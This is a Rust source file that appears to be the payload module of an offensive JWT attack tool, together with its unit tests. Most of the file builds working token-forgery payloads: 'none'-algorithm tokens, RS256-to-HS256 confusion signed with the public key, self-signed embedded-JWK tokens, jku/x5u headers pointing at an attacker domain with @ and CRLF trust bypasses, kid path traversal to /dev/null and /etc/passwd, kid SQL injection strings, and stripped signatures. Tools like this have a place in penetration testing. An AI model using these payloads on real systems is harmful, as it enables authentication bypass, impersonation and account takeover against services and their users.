// Payload module for JWT attack payloads
use anyhow::Result;
use base64::{engine::general_purpose, Engine};
use log::info;
use serde_json::json;
use zeroize::Zeroize;

/// Extract the claims (second) part from a JWT token string
fn extract_claims_part(token: &str) -> Result<&str> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid token format"));
    }
    Ok(parts[1])
}

/// Encode a JSON header and combine with claims part into a JWT-like string
fn encode_header_with_claims(header: &serde_json::Value, claims_part: &str) -> Result<String> {
    let header_json = serde_json::to_string(header)?;
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
    Ok(format!("{encoded_header}.{claims_part}"))
}

/// Build a header.payload signing input from a header JSON value and an existing claims part.
fn signing_input(header: &serde_json::Value, claims_part: &str) -> Result<String> {
    let header_json = serde_json::to_string(header)?;
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
    Ok(format!("{encoded_header}.{claims_part}"))
}

/// Sign an arbitrary signing input with HS256 and return a JWT-formatted token (header.payload.sig).
fn sign_hs256(signing_input: &str, secret: &[u8]) -> String {
    let mut mac = hmac_sha256::HMAC::mac(signing_input.as_bytes(), secret);
    let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(mac.as_slice());
    mac.zeroize();
    format!("{signing_input}.{sig_b64}")
}

/// Read the original `alg` value from a JWT header (without verifying anything).
fn original_alg(token: &str) -> Option<String> {
    let parts: Vec<&str> = token.split('.').collect();
    let header_b64 = parts.first()?;
    let header_bytes = general_purpose::URL_SAFE_NO_PAD.decode(header_b64).ok()?;
    let header_json: serde_json::Value = serde_json::from_slice(&header_bytes).ok()?;
    header_json
        .get("alg")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
}

/// Generate none algorithm payloads
pub fn generate_none_payload(token: &str, alg_value: &str) -> Result<String> {
    let claims_part = extract_claims_part(token)?;

    let header = json!({
        "alg": alg_value,
        "typ": "JWT"
    });

    info!(
        "Generate {alg_value} payload header=\"{}\" payload={alg_value}",
        serde_json::to_string(&header)?
    );

    encode_header_with_claims(&header, claims_part)
}

/// Generate JKU and X5U payloads for URL manipulation attacks
pub fn generate_url_payload(
    token: &str,
    key_type: &str,
    domain: &str,
    trust_domain: Option<&str>,
    protocol: &str,
) -> Result<Vec<String>> {
    let mut payloads = Vec::new();
    let claims_part = extract_claims_part(token)?;

    // Basic payload
    let header = json!({
        "alg": "hs256",
        key_type: domain,
        "typ": "JWT"
    });
    info!(
        "Generate {key_type} + basic payload header=\"{}\" payload={key_type}",
        serde_json::to_string(&header)?
    );
    payloads.push(encode_header_with_claims(&header, claims_part)?);

    // If trust domain is provided, generate bypass payloads
    if let Some(trust_domain) = trust_domain {
        let bypass_urls = [
            format!("{}://{}{}{}", protocol, trust_domain, "Z", domain),
            format!("{protocol}://{trust_domain}@{domain}"),
            format!("{protocol}://{trust_domain}%0d0aHost: {domain}"),
        ];

        for url in &bypass_urls {
            let header = json!({
                "alg": "hs256",
                key_type: url,
                "typ": "JWT"
            });
            info!(
                "Generate {key_type} bypass payload header=\"{}\" payload={key_type}",
                serde_json::to_string(&header)?
            );
            payloads.push(encode_header_with_claims(&header, claims_part)?);
        }
    }

    Ok(payloads)
}

/// Generate algorithm confusion attacks.
///
/// For asymmetric source algorithms (RS*, PS*, ES*, EdDSA) emits a set of header
/// variants that downgrade to the matching HMAC family plus a `none` downgrade.
/// If a PEM-encoded public key is provided, additionally produces a fully signed
/// HMAC token where the **public key bytes are used as the HMAC secret** — the
/// canonical real-world RS256→HS256 attack. Without the key, the HMAC variants
/// are emitted unsigned (header.payload only) so callers can re-sign once they
/// recover the server's public key.
pub fn generate_alg_confusion_payload(
    token: &str,
    public_key: Option<&str>,
) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let source_alg = original_alg(token).unwrap_or_else(|| "RS256".to_string());
    let source_upper = source_alg.to_uppercase();

    // Pick target HMAC algorithm matching the source's hash size.
    let hmac_target = match source_upper.as_str() {
        "RS384" | "PS384" | "ES384" => "HS384",
        "RS512" | "PS512" | "ES512" => "HS512",
        // RS256 / PS256 / ES256 / EdDSA / unknown — default to HS256
        _ => "HS256",
    };

    let mut payloads = Vec::new();

    // Header variants — HMAC downgrade and `none` downgrade.
    let downgrade_algs = [hmac_target, "none"];
    for alg in downgrade_algs {
        let header = json!({
            "alg": alg,
            "typ": "JWT",
        });
        if let Some(pem) = public_key {
            // Real working attack: sign with the public-key bytes as the HMAC secret.
            // Only meaningful for HMAC downgrades; skip for `none`.
            if alg != "none" {
                let input = signing_input(&header, claims_part)?;
                let mac = match alg {
                    "HS256" => {
                        let mut m = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
                        let out = m.to_vec();
                        m.zeroize();
                        out
                    }
                    _ => {
                        // For HS384/HS512 fall back to the jsonwebtoken crate by
                        // pretending the PEM bytes are an opaque secret.
                        let algo = match alg {
                            "HS384" => jsonwebtoken::Algorithm::HS384,
                            _ => jsonwebtoken::Algorithm::HS512,
                        };
                        let key = jsonwebtoken::EncodingKey::from_secret(pem.as_bytes());
                        let sig = jsonwebtoken::crypto::sign(input.as_bytes(), &key, algo)?;
                        // jsonwebtoken returns base64-encoded signature already, decode to bytes
                        general_purpose::URL_SAFE_NO_PAD.decode(sig.as_bytes())?
                    }
                };
                let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(&mac);
                payloads.push(format!("{input}.{sig_b64}"));
                continue;
            }
        }
        // Fallback: emit header.payload without signature.
        payloads.push(encode_header_with_claims(&header, claims_part)?);
    }

    info!(
        "Generated algorithm confusion payloads: {} -> {} (+none)",
        source_upper, hmac_target
    );

    Ok(payloads)
}

/// Generate a JWT with an attacker-controlled key embedded in the `jwk` header.
///
/// Some libraries trust a JWK supplied directly in the JOSE header as the
/// verification key. This generates a fresh RSA-2048 key pair, embeds the
/// public key as a JWK in the header, and signs the token with the matching
/// private key — producing a fully verifiable attack token.
pub fn generate_jwk_embed_payload(token: &str) -> Result<String> {
    use rsa::pkcs8::EncodePrivateKey;
    use rsa::traits::PublicKeyParts;
    use rsa::RsaPrivateKey;

    let claims_part = extract_claims_part(token)?;

    let mut rng = rsa::rand_core::OsRng;
    let private_key = RsaPrivateKey::new(&mut rng, 2048)
        .map_err(|e| anyhow::anyhow!("Failed to generate RSA key: {}", e))?;
    let public_key = private_key.to_public_key();

    let n_b64 = general_purpose::URL_SAFE_NO_PAD.encode(public_key.n().to_bytes_be());
    let e_b64 = general_purpose::URL_SAFE_NO_PAD.encode(public_key.e().to_bytes_be());

    let kid = "jwt-hack-injected";
    let jwk = json!({
        "kty": "RSA",
        "use": "sig",
        "alg": "RS256",
        "kid": kid,
        "n": n_b64,
        "e": e_b64,
    });

    let header = json!({
        "alg": "RS256",
        "typ": "JWT",
        "kid": kid,
        "jwk": jwk,
    });

    let input = signing_input(&header, claims_part)?;
    let pem = private_key
        .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
        .map_err(|e| anyhow::anyhow!("Failed to export private key: {}", e))?
        .to_string();
    let key = jsonwebtoken::EncodingKey::from_rsa_pem(pem.as_bytes())?;
    let sig_b64 =
        jsonwebtoken::crypto::sign(input.as_bytes(), &key, jsonwebtoken::Algorithm::RS256)?;

    info!("Generated jwk-embedded RS256 payload (signed with embedded key)");

    Ok(format!("{input}.{sig_b64}"))
}

/// Generate kid header path-traversal / file-substitution payloads.
///
/// When a server resolves the `kid` value as a file path to load a key, an
/// attacker can substitute a file with known contents (empty for `/dev/null`,
/// or a predictable file) and forge a valid HMAC signature using those bytes
/// as the secret. Each payload is fully signed against the substituted "key".
pub fn generate_kid_traversal_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    // (kid value, secret bytes the server would load when resolving it)
    let cases: &[(&str, &[u8])] = &[
        ("/dev/null", b""),
        ("../../../../../../dev/null", b""),
        ("..\\..\\..\\..\\..\\dev\\null", b""),
        ("file:///dev/null", b""),
        ("/var/empty/null", b""),
        // Plain read-attempts — sig won't verify but exposes path-traversal/LFI behavior
        ("../../../../../../etc/passwd", b""),
        ("/etc/passwd", b""),
        // Null-byte truncation hint
        ("legit-key\x00../../../dev/null", b""),
    ];

    let mut payloads = Vec::with_capacity(cases.len());
    for (kid, secret) in cases {
        let header = json!({
            "alg": "HS256",
            "typ": "JWT",
            "kid": kid,
        });
        let input = signing_input(&header, claims_part)?;
        payloads.push(sign_hs256(&input, secret));
    }

    info!("Generated kid path-traversal payloads (signed with empty secret)");
    Ok(payloads)
}

/// Generate `crit` header bypass payloads.
///
/// RFC 7515 §4.1.11 requires implementations to reject tokens with unrecognised
/// `crit` parameters. Libraries that ignore the rule can be tricked into
/// honouring unknown headers (or skipping signature checks).
pub fn generate_crit_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let variants: Vec<serde_json::Value> = vec![
        json!({ "alg": "HS256", "typ": "JWT", "crit": ["b64"], "b64": false }),
        json!({ "alg": "HS256", "typ": "JWT", "crit": ["x-custom"], "x-custom": "bypass" }),
        json!({ "alg": "none", "typ": "JWT", "crit": ["alg"] }),
        // Empty crit — some libs misparse and skip signature validation
        json!({ "alg": "HS256", "typ": "JWT", "crit": [] }),
    ];

    let mut payloads = Vec::with_capacity(variants.len());
    for header in variants {
        payloads.push(encode_header_with_claims(&header, claims_part)?);
    }
    info!("Generated crit header bypass payloads");
    Ok(payloads)
}

/// Generate RFC 7797 unencoded payload (`b64: false`) attack payloads.
pub fn generate_b64_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let variants: Vec<serde_json::Value> = vec![
        json!({ "alg": "HS256", "typ": "JWT", "b64": false, "crit": ["b64"] }),
        json!({ "alg": "RS256", "typ": "JWT", "b64": false, "crit": ["b64"] }),
        // b64=false without crit — many libs silently honour it
        json!({ "alg": "HS256", "typ": "JWT", "b64": false }),
    ];

    let mut payloads = Vec::with_capacity(variants.len());
    for header in variants {
        payloads.push(encode_header_with_claims(&header, claims_part)?);
    }
    info!("Generated b64 (RFC 7797) bypass payloads");
    Ok(payloads)
}

/// Generate signature-stripped / empty-signature payloads.
///
/// Some libraries treat an empty third segment as a valid signature when the
/// algorithm is not explicitly `none`. The original header is preserved so
/// the server still sees its expected `alg`.
pub fn generate_empty_sig_payload(token: &str) -> Result<Vec<String>> {
    let parts: Vec<&str> = token.split('.').collect();
    if parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid token format"));
    }
    let header_b64 = parts[0];
    let claims_part = parts[1];

    let payloads = vec![
        // Empty signature segment
        format!("{header_b64}.{claims_part}."),
        // No third segment at all
        format!("{header_b64}.{claims_part}"),
        // Literal "null" — some JSON-aware parsers accept
        format!("{header_b64}.{claims_part}.null"),
    ];
    info!("Generated signature-stripped payloads");
    Ok(payloads)
}

/// Generate kid header SQL injection payloads
pub fn generate_kid_sql_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let sql_injection_patterns = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT 'secret-key' --",
        "' OR 1=1 #",
        "' OR 1=1 -- -",
        "x' UNION SELECT 'key",
        "key-0",
    ];

    let payloads: Result<Vec<String>> = sql_injection_patterns
        .iter()
        .map(|pattern| {
            let header = json!({
                "alg": "HS256",
                "typ": "JWT",
                "kid": pattern
            });
            encode_header_with_claims(&header, claims_part)
        })
        .collect();

    info!("Generated kid SQL injection payloads");

    payloads
}

/// Generate x5c header injection payloads
pub fn generate_x5c_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let sample_certificates = [
        vec!["MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA"],
        vec![
            "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA",
            "MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2",
        ],
    ];

    let payloads: Result<Vec<String>> = sample_certificates
        .iter()
        .map(|cert_chain| {
            let header = json!({
                "alg": "RS256",
                "typ": "JWT",
                "x5c": cert_chain
            });
            encode_header_with_claims(&header, claims_part)
        })
        .collect();

    info!("Generated x5c header injection payloads");

    payloads
}

/// Generate cty header manipulation payloads
pub fn generate_cty_payload(token: &str) -> Result<Vec<String>> {
    let claims_part = extract_claims_part(token)?;

    let content_types = [
        "text/xml",
        "application/xml",
        "application/x-java-serialized-object",
        "application/json+x-jackson-smile",
    ];

    let payloads: Result<Vec<String>> = content_types
        .iter()
        .map(|cty| {
            let header = json!({
                "alg": "HS256",
                "typ": "JWT",
                "cty": cty
            });
            encode_header_with_claims(&header, claims_part)
        })
        .collect();

    info!("Generated cty header manipulation payloads");

    payloads
}

/// Generate all available payloads for a token
pub fn generate_all_payloads(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
    target: Option<&str>,
) -> Result<Vec<String>> {
    let mut payloads = Vec::new();

    // Parse target parameter
    let targets: std::collections::HashSet<String> = match target {
        Some(t) => t.split(',').map(|s| s.trim().to_lowercase()).collect(),
        None => std::collections::HashSet::from(["all".to_string()]),
    };

    let should_generate_all = targets.contains("all");

    // None algorithm payloads
    if should_generate_all || targets.contains("none") {
        payloads.push(generate_none_payload(token, "none")?);
        payloads.push(generate_none_payload(token, "NonE")?);
        payloads.push(generate_none_payload(token, "NONE")?);
    }

    // URL payloads if attack domain is provided
    if let Some(attack_domain) = jwk_attack {
        // JKU payloads
        if should_generate_all || targets.contains("jku") {
            let jku_payloads =
                generate_url_payload(token, "jku", attack_domain, jwk_trust, jwk_protocol)?;
            payloads.extend(jku_payloads);
        }

        // X5U payloads
        if should_generate_all || targets.contains("x5u") {
            let x5u_payloads =
                generate_url_payload(token, "x5u", attack_domain, jwk_trust, jwk_protocol)?;
            payloads.extend(x5u_payloads);
        }
    }

    // Algorithm confusion payloads
    if should_generate_all || targets.contains("alg_confusion") {
        let alg_confusion_payloads = generate_alg_confusion_payload(token, None)?;
        payloads.extend(alg_confusion_payloads);
    }

    // kid SQL injection payloads
    if should_generate_all || targets.contains("kid_sql") {
        let kid_sql_payloads = generate_kid_sql_payload(token)?;
        payloads.extend(kid_sql_payloads);
    }

    // x5c header injection payloads
    if should_generate_all || targets.contains("x5c") {
        let x5c_payloads = generate_x5c_payload(token)?;
        payloads.extend(x5c_payloads);
    }

    // cty header manipulation payloads
    if should_generate_all || targets.contains("cty") {
        let cty_payloads = generate_cty_payload(token)?;
        payloads.extend(cty_payloads);
    }

    // jwk embedded header (real, signed attack)
    if should_generate_all || targets.contains("jwk_embed") {
        // This is intentionally allowed to bubble — RSA generation rarely fails.
        let p = generate_jwk_embed_payload(token)?;
        payloads.push(p);
    }

    // kid path-traversal payloads
    if should_generate_all || targets.contains("kid_traversal") {
        payloads.extend(generate_kid_traversal_payload(token)?);
    }

    // crit header bypass payloads
    if should_generate_all || targets.contains("crit") {
        payloads.extend(generate_crit_payload(token)?);
    }

    // RFC 7797 b64=false payloads
    if should_generate_all || targets.contains("b64") {
        payloads.extend(generate_b64_payload(token)?);
    }

    // Empty / stripped signature payloads
    if should_generate_all || targets.contains("empty_sig") {
        payloads.extend(generate_empty_sig_payload(token)?);
    }

    Ok(payloads)
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::engine::general_purpose::URL_SAFE_NO_PAD;
    use serde_json::Value; // Engine trait itself is not directly used, URL_SAFE_NO_PAD is an instance

    const DUMMY_TOKEN: &str = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

    fn get_header_from_token(token_str: &str) -> Option<Value> {
        let parts: Vec<&str> = token_str.split('.').collect();
        if parts.is_empty() {
            // Should be parts.len() < 1, or more robustly parts.get(0).is_none()
            return None;
        }
        URL_SAFE_NO_PAD
            .decode(parts[0])
            .ok()
            .and_then(|bytes| serde_json::from_slice(&bytes).ok())
    }

    #[test]
    fn test_generate_none_payload_lowercase() {
        let result = generate_none_payload(DUMMY_TOKEN, "none");
        assert!(result.is_ok());
        let token = result.unwrap();
        // The function generate_none_payload currently creates a token with 2 parts (header.payload)
        assert_eq!(token.split('.').count(), 2, "Token should have 2 parts for 'none' alg without signature part explicitly added by the function.");

        let header =
            get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "none");
        assert_eq!(header.get("typ").unwrap().as_str().unwrap(), "JWT");
    }

    #[test]
    fn test_generate_none_payload_mixed_case() {
        let result = generate_none_payload(DUMMY_TOKEN, "NonE");
        assert!(result.is_ok());
        let token = result.unwrap();
        let header =
            get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "NonE");
    }

    #[test]
    fn test_generate_none_payload_uppercase() {
        let result = generate_none_payload(DUMMY_TOKEN, "NONE");
        assert!(result.is_ok());
        let token = result.unwrap();
        let header =
            get_header_from_token(&token).expect("Failed to decode header from generated token");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "NONE");
    }

    #[test]
    fn test_generate_none_payload_invalid_token_format() {
        let result = generate_none_payload("invalidtoken", "none"); // Only one part
        assert!(
            result.is_err(),
            "Expected error for invalid token format (single part)"
        );

        // For "headeronly.", parts are ["headeronly", ""]. len is 2. generate_none_payload should work.
        let result_no_payload = generate_none_payload("headeronly.", "none");
        assert!(
            result_no_payload.is_ok(),
            "Expected Ok for token 'headeronly.', got {:?}",
            result_no_payload.err()
        );
    }

    #[test]
    fn test_generate_url_payload_jku_basic() {
        let result = generate_url_payload(DUMMY_TOKEN, "jku", "attacker.com", None, "http");
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(payloads.len(), 1);
        let header =
            get_header_from_token(&payloads[0]).expect("Failed to decode header from JKU payload");
        assert_eq!(header.get("alg").unwrap().as_str().unwrap(), "hs256"); // Default alg in function
        assert_eq!(header.get("typ").unwrap().as_str().unwrap(), "JWT");
        assert_eq!(header.get("jku").unwrap().as_str().unwrap(), "attacker.com");
    }

    #[test]
    fn test_generate_url_payload_x5u_with_trust() {
        let result = generate_url_payload(
            DUMMY_TOKEN,
            "x5u",
            "attacker.com",
            Some("victim.com"),
            "https",
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();
        // Expected: basic, bypass_z, bypass_at, crlf = 4 payloads
        assert_eq!(
            payloads.len(),
            4,
            "Unexpected number of payloads for x5u with trust domain"
        );

        // Check basic payload
        let basic_payload = payloads
            .iter()
            .find(|p| {
                let hdr = get_header_from_token(p).unwrap();
                hdr.get("x5u").unwrap().as_str().unwrap() == "attacker.com"
            })
            .expect("Basic attacker.com payload not found");
        let basic_header = get_header_from_token(basic_payload).unwrap();
        assert_eq!(
            basic_header.get("x5u").unwrap().as_str().unwrap(),
            "attacker.com"
        );

        // Check for one of the bypass payloads (e.g., Z separator)
        assert!(
            payloads.iter().any(|p| {
                get_header_from_token(p)
                    .unwrap()
                    .get("x5u")
                    .unwrap()
                    .as_str()
                    .unwrap()
                    .contains("victim.comZattacker.com")
            }),
            "Bypass payload with Z separator not found"
        );
        assert!(
            payloads.iter().any(|p| {
                get_header_from_token(p)
                    .unwrap()
                    .get("x5u")
                    .unwrap()
                    .as_str()
                    .unwrap()
                    .contains("victim.com@attacker.com")
            }),
            "Bypass payload with @ separator not found"
        );
        assert!(
            payloads.iter().any(|p| {
                get_header_from_token(p)
                    .unwrap()
                    .get("x5u")
                    .unwrap()
                    .as_str()
                    .unwrap()
                    .contains("victim.com%0d0aHost: attacker.com")
            }),
            "Bypass payload with CRLF not found"
        );
    }

    #[test]
    fn test_generate_url_payload_invalid_token_format() {
        // For "invalid.token", parts are ["invalid", "token"]. len is 2. generate_url_payload should work.
        let result = generate_url_payload("invalid.token", "jku", "attacker.com", None, "http");
        assert!(
            result.is_ok(),
            "Expected Ok for token 'invalid.token', got {:?}",
            result.err()
        );

        // Test with a single part token, which should fail
        let result_single_part =
            generate_url_payload("invalidtoken", "jku", "attacker.com", None, "http");
        assert!(
            result_single_part.is_err(),
            "Expected error for single part token in generate_url_payload"
        );
    }

    #[test]
    fn test_generate_alg_confusion_payload() {
        let result = generate_alg_confusion_payload(DUMMY_TOKEN, None);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert!(!payloads.is_empty());

        // Check that the algorithm has been changed to HS256
        let header = get_header_from_token(&payloads[0])
            .expect("Failed to decode header from alg confusion payload");
        assert_eq!(
            header.get("alg").unwrap().as_str().unwrap().to_lowercase(),
            "hs256"
        );
    }

    #[test]
    fn test_generate_kid_sql_payload() {
        let result = generate_kid_sql_payload(DUMMY_TOKEN);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert!(!payloads.is_empty());

        // Check that at least one payload contains a SQL injection pattern
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            let kid = header.get("kid").unwrap().as_str().unwrap();
            kid.contains("'") || kid.contains("UNION") || kid.contains("--")
        }));
    }

    #[test]
    fn test_generate_x5c_payload() {
        let result = generate_x5c_payload(DUMMY_TOKEN);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert!(!payloads.is_empty());

        // Check that all payloads contain an x5c header
        assert!(payloads.iter().all(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("x5c")
        }));
    }

    #[test]
    fn test_generate_cty_payload() {
        let result = generate_cty_payload(DUMMY_TOKEN);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert!(!payloads.is_empty());

        // Check for specific content types
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("cty").unwrap().as_str().unwrap() == "text/xml"
        }));

        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("cty").unwrap().as_str().unwrap() == "application/x-java-serialized-object"
        }));
    }

    #[test]
    fn test_generate_all_payloads_basic() {
        let result = generate_all_payloads(DUMMY_TOKEN, None, None, "http", None);
        assert!(result.is_ok());
        let payloads = result.unwrap();
        // Expected: "none", "NonE", "NONE" + new attack payloads
        assert!(
            payloads.len() >= 3,
            "Expected at least 3 'none' algorithm payloads"
        );
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
        }));
    }

    #[test]
    fn test_generate_all_payloads_with_url_attacks() {
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            Some("victim.com"),
            Some("attacker.com"),
            "https",
            None,
        );
        assert!(
            result.is_ok(),
            "generate_all_payloads failed: {:?}",
            result.err()
        );
        let payloads = result.unwrap();

        // Make sure we get a substantial number of payloads including the new attack types
        assert!(payloads.len() > 11);

        assert!(
            payloads.iter().any(|p| {
                let header = get_header_from_token(p).unwrap();
                header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
            }),
            "No 'none' payloads found"
        );

        assert!(
            payloads.iter().any(|p| get_header_from_token(p)
                .unwrap()
                .as_object()
                .unwrap()
                .contains_key("jku")),
            "No JKU payloads found"
        );
        assert!(
            payloads.iter().any(|p| get_header_from_token(p)
                .unwrap()
                .as_object()
                .unwrap()
                .contains_key("x5u")),
            "No X5U payloads found"
        );

        // Check if at least one JKU payload has the trust domain bypass
        assert!(
            payloads.iter().any(|p| {
                let header_val = get_header_from_token(p).unwrap();
                let header = header_val.as_object().unwrap();
                header.contains_key("jku")
                    && header
                        .get("jku")
                        .unwrap()
                        .as_str()
                        .unwrap()
                        .contains("victim.com")
            }),
            "No JKU bypass payload with victim.com found"
        );

        // Check if at least one X5U payload has the trust domain bypass
        assert!(
            payloads.iter().any(|p| {
                let header_val = get_header_from_token(p).unwrap();
                let header = header_val.as_object().unwrap();
                header.contains_key("x5u")
                    && header
                        .get("x5u")
                        .unwrap()
                        .as_str()
                        .unwrap()
                        .contains("victim.com")
            }),
            "No X5U bypass payload with victim.com found"
        );
    }

    #[test]
    fn test_generate_all_payloads_with_target() {
        // Test with only 'none' target
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            Some("victim.com"),
            Some("attacker.com"),
            "https",
            Some("none"),
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(
            payloads.len(),
            3,
            "Expected only 3 'none' algorithm payloads"
        );
        assert!(payloads.iter().all(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
        }));

        // Test with only 'jku' target
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            Some("victim.com"),
            Some("attacker.com"),
            "https",
            Some("jku"),
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(payloads.len(), 4, "Expected 4 JKU payloads");
        assert!(payloads.iter().all(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("jku")
        }));
        assert!(!payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("x5u")
        }));

        // Test with combined targets
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            Some("victim.com"),
            Some("attacker.com"),
            "https",
            Some("none,x5u"),
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();
        assert_eq!(
            payloads.len(),
            3 + 4,
            "Expected 3 'none' + 4 'x5u' payloads"
        );
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.get("alg").unwrap().as_str().unwrap().to_lowercase() == "none"
        }));
        assert!(payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("x5u")
        }));
        assert!(!payloads.iter().any(|p| {
            let header = get_header_from_token(p).unwrap();
            header.as_object().unwrap().contains_key("jku")
        }));

        // Test with new attack types
        let result = generate_all_payloads(
            DUMMY_TOKEN,
            None,
            None,
            "http",
            Some("alg_confusion,kid_sql"),
        );
        assert!(result.is_ok());
        let payloads = result.unwrap();

        // Check for alg_confusion payloads
        assert!(payloads.iter().any(|p| {
            if let Some(header) = get_header_from_token(p) {
                if let Some(alg) = header.get("alg") {
                    if let Some(alg_str) = alg.as_str() {
                        return alg_str.to_lowercase() == "hs256";
                    }
                }
            }
            false
        }));

        // Check for kid_sql payloads
        assert!(payloads.iter().any(|p| {
            if let Some(header) = get_header_from_token(p) {
                if let Some(kid) = header.get("kid") {
                    if let Some(kid_str) = kid.as_str() {
                        return kid_str.contains("'")
                            || kid_str.contains("UNION")
                            || kid_str.contains("--");
                    }
                }
            }
            false
        }));
    }
}
